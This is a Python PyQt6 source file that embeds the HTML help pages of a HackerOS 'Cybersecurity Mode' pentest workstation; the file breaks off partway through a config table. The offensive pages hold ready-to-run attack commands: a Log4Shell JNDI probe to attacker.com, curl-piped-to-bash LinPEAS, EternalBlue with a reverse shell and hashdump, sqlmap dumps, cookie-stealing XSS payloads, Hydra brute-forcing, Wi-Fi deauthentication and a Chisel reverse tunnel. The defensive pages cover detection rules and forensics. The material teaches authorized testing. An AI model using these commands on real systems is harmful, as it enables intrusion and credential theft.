from __future__ import annotations
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QFrame, QScrollArea, QTreeWidget, QTreeWidgetItem,
    QTextBrowser, QLineEdit, QSizePolicy, QSplitter
)
from PyQt6.QtCore import Qt, pyqtSignal
from PyQt6.QtGui import QFont

# ─────────────────────────────────────────────────────────────────────────────
# Documentation content
# Each value is an HTML string rendered in QTextBrowser
# ─────────────────────────────────────────────────────────────────────────────

CSS = """
<style>
  body  { font-family: 'JetBrains Mono', monospace; font-size: 13px;
          background: #111114; color: #c0c0cc; margin: 0; padding: 0; }
  h1    { color: #e8e8f0; font-size: 20px; font-weight: 800;
          border-bottom: 1px solid #2a2a38; padding-bottom: 10px; margin-bottom: 14px; }
  h2    { color: #dde0ea; font-size: 15px; font-weight: 700;
          margin-top: 22px; margin-bottom: 8px; }
  h3    { color: #aab0c0; font-size: 13px; font-weight: 700;
          margin-top: 16px; margin-bottom: 6px; }
  p     { color: #8a8a9a; line-height: 1.65; margin-bottom: 10px; }
  ul    { color: #8a8a9a; padding-left: 18px; margin-bottom: 10px; }
  li    { margin-bottom: 5px; line-height: 1.5; }
  code  { background: #1a1a22; color: #22e87a; padding: 1px 6px;
          border-radius: 3px; font-size: 12px; border: 1px solid #2a2a3a; }
  pre   { background: #0c0d10; color: #22e87a; padding: 14px 16px;
          border-radius: 6px; font-size: 12px; border: 1px solid #1e2028;
          white-space: pre-wrap; word-wrap: break-word; margin: 12px 0; }
  .red  { color: #ef4444; }
  .blue { color: #3b82f6; }
  .grn  { color: #22c55e; }
  .ylw  { color: #eab308; }
  .dim  { color: #555566; }
  .tag  { display: inline-block; background: #1e2028;
          border: 1px solid #2a2a38; border-radius: 3px;
          padding: 1px 8px; font-size: 11px; color: #666; margin: 2px; }
  .box  { background: #141418; border: 1px solid #2a2a38; border-radius: 6px;
          padding: 14px 16px; margin: 12px 0; }
  .warn { background: #1e1800; border: 1px solid #eab30844; border-radius: 6px;
          padding: 12px 16px; margin: 12px 0; color: #cca020; }
  .tip  { background: #0a1a0e; border: 1px solid #22c55e44; border-radius: 6px;
          padding: 12px 16px; margin: 12px 0; color: #70b080; }
  table { width: 100%; border-collapse: collapse; margin: 12px 0; }
  th    { background: #16161e; color: #555; font-size: 10px; letter-spacing: 1px;
          text-transform: uppercase; padding: 8px 12px; text-align: left;
          border-bottom: 1px solid #2a2a38; }
  td    { padding: 8px 12px; border-bottom: 1px solid #1a1a22;
          color: #888; font-size: 12px; }
  td:first-child { color: #22c55e; font-family: monospace; }
</style>
"""

def page(content: str) -> str:
    return f"<html><body>{CSS}{content}</body></html>"

DOCS: dict[str, dict[str, str]] = {

    "Getting Started": {

        "Welcome": page("""
<h1>Welcome to Cybersecurity Mode <span class="dim">v0.1</span></h1>
<p><b>Cybersecurity Mode</b> is a professional-grade security workstation for <b>HackerOS</b>.
It provides two operational contexts — red (offensive) and blue (defensive) — inside an isolated
<b>BlackArch Linux</b> Podman container.</p>

<div class="box">
<b class="grn">Key concept:</b> All security tools run inside a container. Your host system stays clean.
Results and configs saved to <code>/home</code> persist between sessions.
</div>

<h2>Two Modes</h2>
<ul>
  <li><span class="red">⚔ Red Mode</span> — Offensive security, penetration testing, exploitation</li>
  <li><span class="blue">🛡 Blue Mode</span> — Defensive security, monitoring, hardening, compliance</li>
</ul>

<h2>Interface Sections</h2>
<ul>
  <li><b>Main</b> — Tool browser, container control, category filters</li>
  <li><b>Terminal</b> — Direct shell access inside the container (uses <code>hsh</code>)</li>
  <li><b>Docs</b> — This documentation panel</li>
  <li><b>Settings</b> — Theme, container, shell, keybinding configuration</li>
</ul>

<h2>Quick Start</h2>
<pre>1. Click "Start Container" in the Main panel
2. Container launches BlackArch Linux environment
3. Click ▶ on any tool card to open it in the terminal
4. Or switch to Terminal tab and type commands directly</pre>
"""),

        "First Steps": page("""
<h1>First Steps</h1>

<h2>1. Start the Container</h2>
<p>Go to <b>Main</b> panel → click <b>Start Container</b>. The backend pulls
<code>blackarchlinux/blackarch</code> via Podman and starts the container.</p>
<pre>podman start cybersec-mode-env
# or if first time:
podman run -d --name cybersec-mode-env \\
  --privileged --network host \\
  --cap-add NET_ADMIN --cap-add NET_RAW \\
  -v /home:/home:rw blackarchlinux/blackarch sleep infinity</pre>

<h2>2. Open the Terminal</h2>
<p>Switch to the <b>Terminal</b> tab. Commands run inside the BlackArch container via
<code>hsh</code> (or bash fallback if hsh not installed).</p>

<h2>3. Run Your First Scan</h2>
<pre>nmap -sn 192.168.1.0/24          # host discovery
nmap -sV -sC 192.168.1.100        # service + script scan
nmap -p- -T4 192.168.1.100        # all 65535 ports</pre>

<h2>4. Switch Modes</h2>
<p>Use <b>Hacker Menu → Change Mode</b> or:</p>
<pre>cybersec set-mode blue   # from outside the session
cybersec set-mode red</pre>

<div class="tip">
<b>Tip:</b> Use <code>Ctrl+T</code> to jump to Terminal, <code>Ctrl+M</code> to Main,
<code>Ctrl+H</code> for Hacker Menu.
</div>
"""),

        "hsh Shell": page("""
<h1>hsh Shell</h1>
<p><code>/usr/bin/hsh</code> is the native HackerOS shell used inside the Cybersecurity Mode container.
If hsh is not installed, <code>bash</code> is used as a fallback.</p>

<h2>Why hsh?</h2>
<ul>
  <li>Designed for HackerOS — tightly integrated with the environment</li>
  <li>Lighter than bash/zsh for container use</li>
  <li>Compatible with standard POSIX shell scripts</li>
</ul>

<h2>Shell Selection</h2>
<p>In <b>Settings → Shell</b>, you can switch between <code>hsh</code>, <code>bash</code>,
<code>zsh</code>, and <code>fish</code>.</p>

<h2>Useful Shell Shortcuts</h2>
<table>
  <tr><th>Shortcut</th><th>Action</th></tr>
  <tr><td>↑ / ↓</td><td>Navigate command history</td></tr>
  <tr><td>Ctrl+L</td><td>Clear terminal output</td></tr>
  <tr><td>Ctrl+C</td><td>Interrupt running command</td></tr>
  <tr><td>Tab</td><td>Autocomplete (if supported by shell)</td></tr>
</table>

<h2>Running Commands Directly</h2>
<pre># From outside the GUI (CLI)
cybersec exec 'nmap -sV 192.168.1.1'

# Open interactive hsh session in container
cybersec shell

# Run arbitrary command
cybersec exec 'bash -c "id && whoami"'</pre>
"""),

        "Container Setup": page("""
<h1>Container Setup</h1>
<p>All tools run inside a <b>BlackArch Linux Podman container</b>.</p>

<h2>Step-by-Step Container Creation</h2>

<h3>Step 1: Pull the Image</h3>
<pre>podman pull blackarchlinux/blackarch</pre>

<h3>Step 2: Create the Container</h3>
<pre>podman run -d \\
  --name cybersec-mode-env \\
  --privileged \\
  --network host \\
  --security-opt seccomp=unconfined \\
  --cap-add NET_ADMIN \\
  --cap-add NET_RAW \\
  --cap-add SYS_PTRACE \\
  -v /home:/home:rw \\
  -v /tmp/cybersec:/tmp/cybersec:rw \\
  blackarchlinux/blackarch \\
  sleep infinity</pre>

<h3>Step 3: Verify It's Running</h3>
<pre>podman ps | grep cybersec-mode-env
# Should show: Up X minutes</pre>

<h3>Step 4: Install Core Tools</h3>
<pre>podman exec cybersec-mode-env bash -c "
  pacman -Sy --noconfirm blackarch-keyring
  pacman -Syu --noconfirm
  pacman -S --noconfirm nmap metasploit burpsuite sqlmap hydra \\
    hashcat john aircrack-ng gobuster nikto wireshark-cli \\
    suricata lynis openvas fail2ban rkhunter clamav auditd
"</pre>

<h3>Step 5: Install hsh (optional)</h3>
<pre>pacman -S --noconfirm hsh   # if available in HackerOS repos</pre>

<div class="warn">
⚠ The container runs with <code>--privileged</code> and <code>--network host</code>
for raw network access. Only use in lab/testing environments.
</div>

<h2>Container Management via CLI</h2>
<pre>cybersec container start   # start container
cybersec container stop    # stop container
cybersec container rm      # remove container
cybersec container logs    # view container logs
cybersec status            # full status overview</pre>
"""),
    },

    "Penetration Testing": {

        "Methodology": page("""
<h1>Penetration Testing Methodology</h1>
<p>Professional penetration testing follows a structured approach:</p>

<div class="box">
<b>PTES — Penetration Testing Execution Standard</b><br><br>
<span class="grn">1.</span> Pre-engagement &amp; scoping<br>
<span class="grn">2.</span> Intelligence gathering (OSINT/Recon)<br>
<span class="grn">3.</span> Threat modeling<br>
<span class="grn">4.</span> Vulnerability analysis<br>
<span class="grn">5.</span> Exploitation<br>
<span class="grn">6.</span> Post-exploitation / pivoting<br>
<span class="grn">7.</span> Reporting
</div>

<h2>Rules of Engagement</h2>
<ul>
  <li>Always have <b>written authorization</b> before any testing</li>
  <li>Define scope clearly — in-scope IPs, out-of-scope systems</li>
  <li>Establish emergency contacts</li>
  <li>Document every step</li>
</ul>
<div class="warn">⚠ Testing systems without authorization is illegal. Cybersecurity Mode
is for authorized testing only.</div>
"""),

        "Reconnaissance": page("""
<h1>Reconnaissance</h1>
<p>Gathering information about the target before active engagement.</p>

<h2>Passive Recon (no direct contact)</h2>
<pre># WHOIS domain lookup
whois target.com

# DNS records
dig target.com ANY
dnsrecon -d target.com -t std

# Subdomain enumeration (passive)
subfinder -d target.com -all
amass enum -passive -d target.com

# Google dorks
site:target.com filetype:pdf
site:target.com inurl:admin

# Certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq .[].name_value

# Email harvesting
theHarvester -d target.com -l 500 -b all</pre>

<h2>Active Recon (direct contact)</h2>
<pre># Host discovery
nmap -sn 192.168.1.0/24
fping -a -g 192.168.1.0/24 2>/dev/null

# Fast port scan
rustscan -a 192.168.1.100 -- -sV -sC

# Full port scan
nmap -p- -T4 -sV -sC 192.168.1.100 -oA /home/results/full_scan

# OS fingerprinting
nmap -O --osscan-guess 192.168.1.100

# Service version detection
nmap -sV --version-intensity 5 192.168.1.100

# UDP scan (slow, important)
nmap -sU --top-ports 200 192.168.1.100

# SMB enumeration
enum4linux-ng -A 192.168.1.100
smbmap -H 192.168.1.100

# SNMP enumeration
onesixtyone -c /usr/share/wordlists/rockyou.txt 192.168.1.100
snmpwalk -c public -v1 192.168.1.100</pre>
"""),

        "Web Application Testing": page("""
<h1>Web Application Testing</h1>

<h2>Information Gathering</h2>
<pre># Fingerprint the web server
whatweb http://target.com
wafw00f http://target.com    # detect WAF

# Directory & file discovery
gobuster dir -u http://target.com \\
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\
  -x php,html,txt,bak -t 50

# Fast recursive discovery
feroxbuster -u http://target.com \\
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \\
  --recursion -d 3

# Parameter discovery
arjun -u http://target.com/search --get

# Collect URLs from history
gau target.com | tee /home/results/urls.txt
waybackurls target.com >> /home/results/urls.txt</pre>

<h2>Vulnerability Scanning</h2>
<pre># Nikto web server scanner
nikto -h http://target.com -o /home/results/nikto.html -Format htm

# Nuclei template scan
nuclei -u http://target.com -t cves/ -t exposures/ -o /home/results/nuclei.txt

# SSL/TLS check
testssl.sh https://target.com --json /home/results/ssl.json
sslscan target.com:443</pre>

<h2>SQL Injection</h2>
<pre># Basic injection test
sqlmap -u "http://target.com/page?id=1" --dbs

# POST request injection
sqlmap -u "http://target.com/login" \\
  --data="user=admin&pass=x" --level=5 --risk=3

# Using request file (from Burp)
sqlmap -r /home/request.txt --dbs --batch

# Dump table data
sqlmap -u "http://target.com/page?id=1" \\
  -D target_db -T users --dump</pre>

<h2>XSS Testing</h2>
<pre># Dalfox XSS scanner
dalfox url "http://target.com/search?q=test" -o /home/results/xss.txt

# XSStrike
xsstrike -u "http://target.com/search?q=test" --crawl

# Manual payloads
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>

<h2>Burp Suite Workflow</h2>
<pre>1. Start Burp Suite: burpsuite
2. Configure browser proxy: 127.0.0.1:8080
3. Import Burp CA certificate into browser
4. Intercept → On
5. Browse target — requests appear in Proxy → HTTP history
6. Right-click → Send to Repeater (manual testing)
7. Right-click → Send to Intruder (brute-force/fuzzing)
8. Scanner tab → Active/Passive scanning</pre>
"""),

        "Exploitation": page("""
<h1>Exploitation</h1>

<h2>Metasploit Framework</h2>
<pre># Start Metasploit
msfconsole -q

# Search for exploits
msf6 &gt; search type:exploit platform:linux cve:2021
msf6 &gt; search eternalblue

# Use an exploit
msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) &gt; set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue) &gt; set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) &gt; run

# Meterpreter post-exploitation
meterpreter &gt; sysinfo
meterpreter &gt; getuid
meterpreter &gt; hashdump
meterpreter &gt; upload /home/linpeas.sh /tmp/linpeas.sh
meterpreter &gt; shell</pre>

<h2>Exploit Searching</h2>
<pre># Search local ExploitDB
searchsploit apache 2.4
searchsploit -m 47887    # copy exploit to current dir

# Update ExploitDB
searchsploit -u</pre>

<h2>Common Vulnerabilities</h2>
<pre># EternalBlue (MS17-010) check
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.100

# Shellshock
curl -A '() { :; }; echo "shellshock"' http://target.com/cgi-bin/test.cgi

# Log4Shell
curl -H 'X-Api-Version: $\{jndi:ldap://attacker.com/a\}' http://target.com/</pre>
"""),

        "Password Attacks": page("""
<h1>Password Attacks</h1>

<h2>Hash Cracking with Hashcat</h2>
<pre># Identify hash type first
hashid '$2y$10$xxxxxxxxxxxxx'
hash-identifier

# MD5 dictionary attack
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM hash (Windows passwords)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# WPA2 handshake
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# SHA-256 with rules
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# bcrypt (slow — GPU helps a lot)
hashcat -m 3200 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt</pre>

<h2>Network Login Brute-Force</h2>
<pre># SSH brute-force with Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\
  ssh://192.168.1.100 -t 4 -V

# HTTP form brute-force
hydra -L users.txt -P passwords.txt \\
  http-post-form://target.com/login:"user=^USER^&pass=^PASS^:Invalid credentials"

# FTP brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100</pre>

<h2>Custom Wordlists</h2>
<pre># CeWL — generate wordlist from website
cewl http://target.com -d 3 -m 6 -w /home/wordlists/custom.txt

# Crunch — generate by pattern
crunch 8 12 abcdefgh0123456789 -o /home/wordlists/gen.txt
crunch 10 10 -t @@@@@12345 -o /home/wordlists/pattern.txt

# CUPP — user profile wordlist
cupp -i   # interactive mode</pre>
"""),

        "Post-Exploitation": page("""
<h1>Post-Exploitation</h1>

<h2>Linux Privilege Escalation</h2>
<pre># Run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
# or upload and run
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# Manual checks
sudo -l                          # sudo permissions
find / -perm -4000 2>/dev/null   # SUID binaries
crontab -l && cat /etc/crontab   # cron jobs
cat /etc/passwd | grep -v nologin
ss -tlnp                         # listening services
ps aux                           # running processes
env                              # environment variables</pre>

<h2>Windows Privilege Escalation</h2>
<pre># WinPEAS (in Meterpreter shell)
upload winpeas.exe C:\\Windows\\Temp\\
shell
C:\\Windows\\Temp\\winpeas.exe

# Common misconfigurations
whoami /priv                     # check privileges
net localgroup administrators    # admin group
schtasks /query /fo LIST /v      # scheduled tasks
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer</pre>

<h2>Lateral Movement</h2>
<pre># Pass-the-Hash with CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH --local-auth

# WMI execution
wmiexec.py domain/user:password@192.168.1.100 'ipconfig'

# PsExec
psexec.py domain/user:password@192.168.1.100 cmd.exe

# Pivoting with Chisel
# Attacker:
chisel server -p 8888 --reverse
# Victim:
chisel client attacker_ip:8888 R:socks</pre>

<h2>BloodHound AD Mapping</h2>
<pre># Collect AD data (on target)
python3 bloodhound.py -u user -p pass -d domain.local -ns DC_IP --zip

# Start Neo4j + BloodHound
neo4j console &amp;
bloodhound &amp;

# Upload ZIP to BloodHound UI
# Then: Analysis → Find Shortest Path to Domain Admins</pre>
"""),

        "Wireless Security": page("""
<h1>Wireless Security Testing</h1>

<h2>Monitor Mode</h2>
<pre># Enable monitor mode
airmon-ng check kill       # kill interfering processes
airmon-ng start wlan0      # creates wlan0mon

# Capture packets
airodump-ng wlan0mon

# Capture specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /home/capture wlan0mon</pre>

<h2>WPA2 Handshake Capture &amp; Crack</h2>
<pre># Capture handshake (wait for client or deauth)
airodump-ng -c 6 --bssid TARGET_BSSID -w /home/handshake wlan0mon

# Force handshake via deauthentication
aireplay-ng -0 10 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Crack handshake
aircrack-ng /home/handshake-01.cap -w /usr/share/wordlists/rockyou.txt

# Or with hashcat (faster)
hcxdumptool -i wlan0mon -o /home/capture.pcapng --enable_status=1
hcxpcapngtool -o /home/hash.hc22000 /home/capture.pcapng
hashcat -m 22000 /home/hash.hc22000 /usr/share/wordlists/rockyou.txt</pre>

<h2>WPS Attacks</h2>
<pre># Check for WPS
wash -i wlan0mon

# Pixie Dust attack (fast)
bully wlan0mon -b TARGET_BSSID -c 6 -d

# PIN brute-force (slow)
reaver -i wlan0mon -b TARGET_BSSID -c 6 -vv</pre>
"""),
    },

    "Defensive Security": {

        "Network Monitoring": page("""
<h1>Network Monitoring</h1>

<h2>Wireshark — Capture Filters</h2>
<pre># Capture only HTTP/HTTPS
tcp port 80 or tcp port 443

# Capture specific host
host 192.168.1.100

# Capture specific subnet
net 192.168.1.0/24

# Exclude own traffic
not host 192.168.1.50</pre>

<h2>Wireshark — Display Filters</h2>
<pre># HTTP POST requests
http.request.method == "POST"

# DNS queries
dns.flags.response == 0

# Failed TCP connections (RST)
tcp.flags.reset == 1

# Large packets (potential exfil)
frame.len &gt; 1400

# ARP requests (network discovery)
arp.opcode == 1

# Suspicious user agents
http.user_agent contains "sqlmap"
http.user_agent contains "nmap"</pre>

<h2>tcpdump One-Liners</h2>
<pre># Capture to file
tcpdump -i eth0 -nn -w /home/capture.pcap

# Show HTTP requests
tcpdump -i eth0 -nn -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)'

# DNS traffic
tcpdump -i eth0 -nn port 53

# SYN scan detection
tcpdump -i eth0 'tcp[tcpflags] == tcp-syn'

# ARP activity
tcpdump -i eth0 arp</pre>

<h2>Zeek Network Analysis</h2>
<pre># Start Zeek on interface
zeek -i eth0

# Analyze pcap file
zeek -r /home/capture.pcap

# Key log files generated:
# conn.log    — all connections
# http.log    — HTTP sessions
# dns.log     — DNS queries
# ssl.log     — TLS sessions
# weird.log   — unusual activity</pre>
"""),

        "IDS / IPS": page("""
<h1>IDS / IPS Configuration</h1>

<h2>Suricata Setup</h2>
<pre># Test config
suricata -T -c /etc/suricata/suricata.yaml

# Start on interface (IDS mode)
suricata -c /etc/suricata/suricata.yaml -i eth0 -D

# Test against pcap
suricata -c /etc/suricata/suricata.yaml -r /home/capture.pcap

# Live alerts
tail -f /var/log/suricata/fast.log
tail -f /var/log/suricata/eve.json | jq .

# Update rules (Emerging Threats)
suricata-update
suricata-update list-sources
suricata-update enable-source et/open</pre>

<h2>Suricata Custom Rules</h2>
<pre># Detect Nmap SYN scan
alert tcp any any -&gt; $HOME_NET any \\
  (msg:"Nmap SYN scan detected"; \\
   flags:S; threshold:type both,track by_src,count 5,seconds 1; \\
   classtype:attempted-recon; sid:9000001; rev:1;)

# Detect SQLmap User-Agent
alert http any any -&gt; $HOME_NET any \\
  (msg:"SQLmap scanner detected"; \\
   http.user_agent; content:"sqlmap"; \\
   classtype:web-application-attack; sid:9000002; rev:1;)</pre>

<h2>Fail2Ban</h2>
<pre># Check status
fail2ban-client status
fail2ban-client status sshd

# Ban/unban IP manually
fail2ban-client set sshd banip 1.2.3.4
fail2ban-client set sshd unbanip 1.2.3.4

# View banned IPs
fail2ban-client get sshd banned

# Custom jail (/etc/fail2ban/jail.local)
[sshd]
enabled = true
maxretry = 3
bantime = 3600
findtime = 600</pre>
"""),

        "System Hardening": page("""
<h1>System Hardening</h1>

<h2>Lynis Security Audit</h2>
<pre># Full system audit
lynis audit system

# Generate report
lynis audit system --report-file /home/results/lynis-report.dat

# View hardening suggestions
grep "SUGGESTION" /var/log/lynis.log

# Specific tests
lynis audit system --tests-from-group authentication
lynis audit system --tests-from-group networking
lynis audit system --tests-from-group malware</pre>

<h2>Firewall with nftables</h2>
<pre># View current rules
nft list ruleset

# Basic server ruleset
nft add table inet filter
nft add chain inet filter input { type filter hook input priority 0; policy drop; }
nft add chain inet filter forward { type filter hook forward priority 0; policy drop; }
nft add chain inet filter output { type filter hook output priority 0; policy accept; }

# Allow established connections
nft add rule inet filter input ct state established,related accept

# Allow loopback
nft add rule inet filter input iif lo accept

# Allow SSH (rate limited)
nft add rule inet filter input tcp dport 22 ct state new limit rate 4/minute accept

# Save rules
nft list ruleset &gt; /etc/nftables.conf</pre>

<h2>Rootkit Detection</h2>
<pre># rkhunter
rkhunter --update
rkhunter --check --skip-keypress
rkhunter --check-all --rwo   # report warnings only

# chkrootkit
chkrootkit
chkrootkit -q   # quiet mode (warnings only)

# AIDE file integrity
aide --init     # create baseline database
aide --check    # compare against baseline</pre>

<h2>auditd — Linux Audit Daemon</h2>
<pre># Start auditd
systemctl enable --now auditd

# Key audit rules (/etc/audit/rules.d/99-custom.rules)
-w /etc/passwd -p wa -k passwd_changes
-w /etc/sudoers -p wa -k sudoers_changes
-w /etc/shadow -p wa -k shadow_changes
-a always,exit -F arch=b64 -S execve -k exec_commands
-w /usr/bin/passwd -p x -k passwd_exec
-a always,exit -F arch=b64 -S open -F exit=-EACCES -k access_denied

# Apply rules
auditctl -R /etc/audit/rules.d/99-custom.rules

# Search audit log
ausearch -k passwd_changes
ausearch -k exec_commands --start today
aureport --summary</pre>
"""),

        "Malware Analysis": page("""
<h1>Malware Analysis</h1>

<h2>Static Analysis</h2>
<pre># File type identification
file suspicious_binary
exiftool suspicious.pdf

# Extract strings
strings suspicious_binary | grep -i "http\|ftp\|192\."
strings -a -n 8 suspicious_binary &gt; /home/results/strings.txt

# PE file analysis (Windows executables)
pe-tree suspicious.exe
objdump -d suspicious.exe | head -100

# YARA scanning
yara /usr/share/yara/rules/malware.yar /home/samples/
# Custom YARA rule
cat &gt; /home/rules/custom.yar &lt;&lt; 'EOF'
rule SuspiciousStrings {
  strings:
    $a = "cmd.exe" nocase
    $b = "powershell" nocase
    $c = "http://"
  condition:
    2 of them
}
EOF
yara /home/rules/custom.yar /home/samples/</pre>

<h2>Dynamic Analysis</h2>
<pre># Trace system calls
strace -f -o /home/results/strace.log ./suspicious_binary

# Trace library calls
ltrace -f -o /home/results/ltrace.log ./suspicious_binary

# Monitor network activity
tcpdump -i eth0 -w /home/results/capture.pcap &amp;
./suspicious_binary
kill %1

# Monitor file changes
inotifywait -m -r /tmp /var/tmp /home &amp;
./suspicious_binary</pre>

<h2>Memory Forensics with Volatility3</h2>
<pre># Analyze memory dump
volatility3 -f memory.dmp windows.info

# List processes
volatility3 -f memory.dmp windows.pslist
volatility3 -f memory.dmp windows.pstree

# Detect hidden processes
volatility3 -f memory.dmp windows.psscan

# Dump network connections
volatility3 -f memory.dmp windows.netstat

# Extract process memory
volatility3 -f memory.dmp windows.procdump --pid 1234</pre>
"""),

        "SIEM & Log Analysis": page("""
<h1>SIEM & Log Analysis</h1>

<h2>Key Log Locations (Linux)</h2>
<pre>/var/log/auth.log        # authentication events
/var/log/syslog          # general system
/var/log/kern.log        # kernel messages
/var/log/apache2/        # Apache access & error
/var/log/nginx/          # Nginx access & error
/var/log/suricata/       # IDS alerts
/var/log/audit/audit.log # auditd events
~/.bash_history          # user command history</pre>

<h2>Log Analysis Commands</h2>
<pre># Failed SSH logins
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Successful logins
grep "Accepted" /var/log/auth.log

# Top IPs hitting web server
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# HTTP 4xx/5xx errors
awk '$9 ~ /^[45]/' /var/log/apache2/access.log | head -50

# Detect port scans in Suricata
grep "ET SCAN" /var/log/suricata/fast.log | awk '{print $7}' | sort | uniq -c

# New users created
grep "useradd\|adduser" /var/log/auth.log</pre>

<h2>Windows Event Log Analysis with Chainsaw</h2>
<pre># Hunt for common attack patterns
chainsaw hunt /mnt/windows/System32/winevt/Logs/ \\
  -s /usr/share/chainsaw/sigma/ \\
  --mapping /usr/share/chainsaw/mappings/sigma-event-logs-all.yml \\
  -r /usr/share/chainsaw/rules/ \\
  --csv --output /home/results/

# Specific event IDs
# 4624 — Successful logon
# 4625 — Failed logon
# 4688 — Process creation
# 4720 — User account created
# 7045 — Service installed

chainsaw search -t "EventID:4625" /mnt/logs/
chainsaw search -t "EventID:4688" /mnt/logs/ | grep "powershell\|cmd"</pre>
"""),

        "Incident Response": page("""
<h1>Incident Response</h1>

<h2>Initial Triage</h2>
<pre># System state snapshot
date &gt; /home/ir/triage.txt
hostname &gt;&gt; /home/ir/triage.txt
uptime &gt;&gt; /home/ir/triage.txt
uname -a &gt;&gt; /home/ir/triage.txt

# Running processes
ps auxf &gt; /home/ir/processes.txt
/proc/*/exe 2&gt;/dev/null | xargs ls -la &gt; /home/ir/process_exe.txt

# Network connections
ss -tlnp &gt; /home/ir/network.txt
ss -anp &gt;&gt; /home/ir/network.txt
netstat -rn &gt;&gt; /home/ir/network.txt

# Logged-in users
who &gt; /home/ir/users.txt
last -n 50 &gt;&gt; /home/ir/users.txt
lastlog &gt;&gt; /home/ir/users.txt

# Recently modified files
find / -newer /tmp -type f -not -path "/proc/*" 2&gt;/dev/null \\
  | head -100 &gt; /home/ir/recent_files.txt

# Cron jobs
crontab -l &gt; /home/ir/crons.txt
ls -la /etc/cron* &gt;&gt; /home/ir/crons.txt</pre>

<h2>Memory Acquisition</h2>
<pre># Using avml (Acquire Volatile Memory for Linux)
avml /home/ir/memory.lime

# Using LiME kernel module
insmod lime-$(uname -r).ko "path=/home/ir/memory.lime format=lime"

# Analyze with Volatility3
volatility3 -f /home/ir/memory.lime linux.pslist
volatility3 -f /home/ir/memory.lime linux.netstat
volatility3 -f /home/ir/memory.lime linux.bash</pre>

<h2>Disk Imaging</h2>
<pre># Create forensic image
dc3dd if=/dev/sda of=/home/ir/disk.dd bs=512 log=/home/ir/dc3dd.log

# Verify integrity
sha256sum /home/ir/disk.dd &gt; /home/ir/disk.sha256

# Mount read-only for analysis
mount -o ro,loop,noatime /home/ir/disk.dd /mnt/evidence</pre>
"""),
    },

    "CLI Reference": {

        "cybersec CLI": page("""
<h1>cybersec CLI Reference</h1>
<p>Binary: <code>/usr/bin/cybersec</code> — Written in Crystal, statically compiled.</p>

<table>
  <tr><th>Command</th><th>Description</th></tr>
  <tr><td>cybersec</td><td>Launch full Cybersecurity Mode session (TTY required, uses cage)</td></tr>
  <tr><td>cybersec please</td><td>Launch GUI in existing desktop session</td></tr>
  <tr><td>cybersec help</td><td>Show command reference</td></tr>
  <tr><td>cybersec version</td><td>Print version (v0.1)</td></tr>
  <tr><td>cybersec status</td><td>Show binary, container, and config status</td></tr>
  <tr><td>cybersec update</td><td>Update container image and packages</td></tr>
  <tr><td>cybersec set-mode red</td><td>Switch to Red (offensive) mode</td></tr>
  <tr><td>cybersec set-mode blue</td><td>Switch to Blue (defensive) mode</td></tr>
  <tr><td>cybersec exec CMD</td><td>Execute command inside the container</td></tr>
  <tr><td>cybersec shell</td><td>Open hsh shell inside container interactively</td></tr>
  <tr><td>cybersec container start</td><td>Start cybersec-mode-env container</td></tr>
  <tr><td>cybersec container stop</td><td>Stop the container</td></tr>
  <tr><td>cybersec container rm</td><td>Remove the container</td></tr>
  <tr><td>cybersec container logs</td><td>Follow container logs</td></tr>
  <tr><td>cybersec tools</td><td>List all available tools by category</td></tr>
  <tr><td>cybersec tools Web</td><td>List tools in specific category</td></tr>
  <tr><td>cybersec plugin list</td><td>List installed plugins</td></tr>
  <tr><td>cybersec plugin install NAME</td><td>Install a plugin (placeholder)</td></tr>
  <tr><td>cybersec plugin remove NAME</td><td>Remove installed plugin</td></tr>
  <tr><td>cybersec plugin info NAME</td><td>Show plugin details</td></tr>
</table>

<h2>Keyboard Shortcuts (GUI)</h2>
<table>
  <tr><th>Shortcut</th><th>Action</th></tr>
  <tr><td>Ctrl+M</td><td>Main panel</td></tr>
  <tr><td>Ctrl+T</td><td>Terminal panel</td></tr>
  <tr><td>Ctrl+D</td><td>Docs panel</td></tr>
  <tr><td>Ctrl+,</td><td>Settings panel</td></tr>
  <tr><td>Ctrl+H</td><td>Toggle Hacker Menu</td></tr>
</table>
"""),

        "Paths & Config": page("""
<h1>Paths & Configuration</h1>

<h2>Important Paths</h2>
<table>
  <tr><th>Path</th><th>Description</th></tr>
  <tr><td>/usr/lib/HackerOS/Cybersecurity-Mode/cybersec-mode-main</td><td>GUI binary (Nuitka)</td></tr>
  <tr><td>/usr/lib/HackerOS/Cybersecurity-Mode/cybersec-mode-backend</td><td>Rust backend</td></tr>
  <tr><td>/usr/bin/cybersec</td><td>Crystal CLI</td></tr>
